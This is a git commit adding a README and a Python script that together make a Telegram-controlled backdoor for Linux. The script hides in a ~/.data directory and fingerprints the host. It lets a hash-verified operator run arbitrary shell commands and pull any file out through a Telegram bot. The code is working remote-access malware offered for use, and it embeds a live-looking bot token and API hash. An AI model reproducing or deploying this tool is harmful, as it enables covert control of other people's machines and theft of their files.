022bf0987b65949dae0c5db39f93e151d726f9d5
Smith <77020542+Special-Esmit@users.noreply.github.com>
2022-08-02 19:35:23 +0430

    Add files via upload

---
+++ README.md
@@ -0,0 +1,9 @@
+change the admin value to an encoded value then create sha256
+
+commands :
+/start : make sure that you are connected
+/status : return uname -a
+/file (address) : return file ( send in telegram )
+/run (command) : run a command in command line
+
+Linux-only
---
+++ mers.py
@@ -0,0 +1,96 @@
+
+import os
+import sys
+import random
+from telethon import TelegramClient, events
+import hashlib
+
+
+# GRD
+
+#_______________________________________________________________________________
+try:
+    os.mkdir("mkdir ~/.data/")
+except:
+    os.popen("echo \"systest\" > /dev/null ")
+try:
+    r = os.popen("whoami").read()
+    r = r.replace("\n",'')
+
+    os.chdir("/home/" + r + "/.data")
+except:
+    print("")
+#_______________________________________________________________________________
+
+
+# OB
+
+#_______________________________________________________________________________
+
+def sha256c(data):
+    encoded = data.encode()
+    m = hashlib.sha256(encoded)
+    return m.hexdigest()
+
+def rand_gen():
+    row = 0
+    dat = 1
+    while row < 12:
+        delix = random.randrange(2, 1000)
+        delix2 = random.randrange(2, 1000)
+        dat += delix*delix2
+        row += 1
+    return dat
+#_______________________________________________________________________________
+
+
+# IS
+
+#_______________________________________________________________________________
+try:
+    infol = "`" + os.popen("uname -a ; echo \n").read() + "`"
+except:
+    print('')
+#_______________________________________________________________________________
+
+
+# TCS | D
+
+#_______________________________________________________________________________
+
+api_id = 4673221
+api_hash = 'be92819809df8d26225ebbcffbaddd2d'
+bot_token = "5125076924:AAHZDMOzMlpIYfyYS7xCdSWCmAWiDFyJGNQ"
+admin = "c5de99d6d851701eeb4d59d5fd322bceb5c40f2d2979b4331a44e59d0e4a6ce0"
+
+bot = TelegramClient("King", api_id, api_hash).start(bot_token=bot_token)
+
+bot.start()
+
+@bot.on(events.NewMessage(pattern=r'/start'))
+async def handler(event):
+    if sha256c(str(event.message.to_id.user_id)) == admin:
+        await event.reply(infol + "you are welcome :D")
+
+@bot.on(events.NewMessage(pattern=r'/status'))
+async def handler(event):
+    if sha256c(str(event.message.to_id.user_id)) == admin:
+        r = os.popen("uptime")
+        await event.reply(infol + r.read())
+
+@bot.on(events.NewMessage(pattern=r'/file'))
+async def handler(event):
+    if sha256c(str(event.message.to_id.user_id)) == admin:
+        e = event.raw_text[6:]
+        await bot.send_file(event.chat_id , e)
+@bot.on(events.NewMessage(pattern=r'/run'))
+async def handler(event):
+    if sha256c(str(event.message.to_id.user_id)) == admin:
+        e = event.raw_text[5:]
+        print(e)
+        r = os.popen(e)
+        await event.reply(infol +r.read())
+
+bot.run_until_disconnected()
+
+#_______________________________________________________________________________
